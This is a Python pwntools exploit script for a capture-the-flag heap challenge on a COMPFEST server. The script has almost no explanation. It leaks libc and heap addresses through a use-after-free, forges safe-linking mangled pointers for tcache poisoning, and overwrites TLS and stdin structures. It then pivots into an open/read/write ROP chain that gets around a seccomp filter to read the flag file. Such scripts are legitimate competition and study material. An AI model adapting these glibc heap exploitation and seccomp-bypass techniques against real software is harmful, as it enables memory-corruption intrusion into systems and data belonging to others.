#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = 'ctf.compfest.id', 7002

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

c
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# $ seccomp-tools dump ./chall
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
#  0005: 0x15 0x05 0x00 0x00000038  if (A == clone) goto 0011
#  0006: 0x15 0x04 0x00 0x00000039  if (A == fork) goto 0011
#  0007: 0x15 0x03 0x00 0x0000003a  if (A == vfork) goto 0011
#  0008: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0011
#  0009: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0011
#  0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0011: 0x06 0x00 0x00 0x00000000  return KILL

def add(idx, size, data):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', str(idx).encode())
    io.sendlineafter(b'>', str(size).encode())
    io.sendafter(b'>', data)

def view(idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', str(idx).encode())

def remove(idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'>', str(idx).encode())

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def arb_write(key, where, what):
    add(0, 0x10, b'consume0')
    add(0, 0x10, b'consume1')

    add(0, 0x10, b'0000')
    add(1, 0x10, b'1111')
    add(2, 0x10, b'2222')

    remove(0)
    add(0, 0x18, b'A'*0x18+p8(0x41))
    remove(1)
    remove(0)
    remove(2)
    add(1, 0x38, b'A'*0x18+p64(0x21)+p64(mangle(key, where)))
    add(0, 0x18, b'consumehehe')
    add(0, 0x18, what)

def exploit():
    global io
    heap = 0x0
    stack = 0x0
    io = initialize()

    for i in range(30):
        add(0, 0x38, b'A'*8)

    add(1, 0x38, b'B')
    add(2, 0x38, b'C')
    add(2, 0x38, b'D')
    for i in range(8):
        add(2, 0x20, b'E')
    add(2, 0x20, b'guard')
    remove(0)
    add(0, 0x38, b'A'*0x38+p8(0xf1))
    remove(1)

    view(1)
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x21ace0
    stdout = libc.sym['_IO_2_1_stdout_']
    stdin = libc.sym['_IO_2_1_stdin_']
    rop = ROP(libc)
    syscall_ret = rop.find_gadget(['syscall', 'ret'])[0]
    leave_ret = libc.address + 0x000000000004da83
    pop_rax = libc.address + 0x0000000000045eb0
    pop_rdi = libc.address + 0x000000000002a3e5
    pop_rsi = libc.address + 0x000000000002be51
    pop_rdx_r12 = libc.address + 0x000000000011f2e7

    remove(2)
    view(2)
    heap = u64(io.recvline().strip().ljust(8, b'\x00'))
    heap = (heap << 12) - 0x2000

    add(1, 0x38, b'A')
    add(2, 0x38, b'B')
    add(2, 0x38, b'C')

    remove(0)
    add(0, 0x20, b'/home/user/flag.txt')
    add(0, 0x20, b'consumeE')
    add(0, 0x38, b'A'*0x38+p8(0xf1))

    remove(0)
    remove(2)

    for i in range(26):
        add(0, 0x10, b'B')

    tls = 0x0
    if not args.REMOTE:
        tls = int(input("tls >>"), 16)
    else:
        tls = libc.address - 0x28c0

    remove(1)
    add(1, 0x10, b'idk')
    add(1, 0x10, b'idk')
    add(1, 0x10, b'idk')
    add(1, 0x10, b'idk')
    add(1, 0x10, p64(mangle(heap+0x24d0, tls-88-8)))

    add(1, 0x38, flat([ # ignore this allocation, does nothing, just to not break everything else
        leave_ret<<17,
        0x1,
    ]))
    add(1, 0x38, flat([
        0x0,
        tls+0x100 # rop start address
    ]))

    arb_write(heap+0x2690, tls+0x30, p64(0x0))
    arb_write(heap+0x2690, stdin+0x30, flat([
        tls+0x100-0x8, tls+0x100-0x8, tls+0x200
    ]))

    payload = flat([
        leave_ret<<17,
        pop_rax, 0x2,
        pop_rdi, heap+0x2540,
        pop_rsi, 0x0,
        pop_rdx_r12, 0x0, 0x0,
        syscall_ret,

        pop_rax, 0x0,
        pop_rdi, 0x3,
        pop_rsi, heap+0x100,
        pop_rdx_r12, 0x100, 0x0,
        syscall_ret,

        pop_rax, 0x1,
        pop_rdi, 0x1,
        syscall_ret,
    ])
    payload = b'4' + b'\x00'*7 + payload

    pause()
    io.sendlineafter(b'>', payload)

    log.info("heap: %#x", heap)
    log.info("libc base: %#x", libc.address)
    log.info("stack: %#x", stack)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
